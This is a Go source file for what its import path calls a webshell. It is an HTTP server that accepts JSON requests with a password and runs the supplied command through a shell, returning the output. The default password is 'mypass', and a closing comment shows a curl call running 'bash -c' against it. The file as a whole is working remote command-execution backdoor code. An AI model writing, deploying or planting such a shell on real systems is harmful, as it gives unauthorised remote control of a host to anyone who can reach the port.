package main

import (
	"encoding/json"
	"errors"
	"flag"
	"log"
	"net/http"

	"webshell/lib/shell"
)

var pass *string

type command struct {
	Pass string
	Cmd  string
	Opt  string
	Args string
}

func decodeRequest(r *http.Request) (command, error) {
	var req command

	err := json.NewDecoder(r.Body).Decode(&req)

	if err != nil {
		return req, errors.New("error parsing json payload")
	}

	return req, nil
}

func verifyPassword(givenPassword string, requiredPassword string) error {
	if givenPassword != requiredPassword {
		return errors.New("wrong password")
	}

	return nil
}

func handler(w http.ResponseWriter, r *http.Request) {
	command, err := decodeRequest(r)

	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	err = verifyPassword(command.Pass, *pass)

	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	err = shell.ExecuteCommand(command.Cmd, command.Opt, command.Args, w)
	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}
}

func main() {
	pass = flag.String("pass", "mypass", "passwd")
	addr := flag.String("addr", ":9090", "bind addr and port")

	flag.Parse()

	http.HandleFunc("/", handler)

	log.Printf("start http server\n")
	log.Fatal(http.ListenAndServe(*addr, nil))
}

// curl -X POST -d '{"pass": "mypass", "cmd": "bash", "opt": "-c", "args": "ls -l ~; echo hello"}' http://localhost:9090
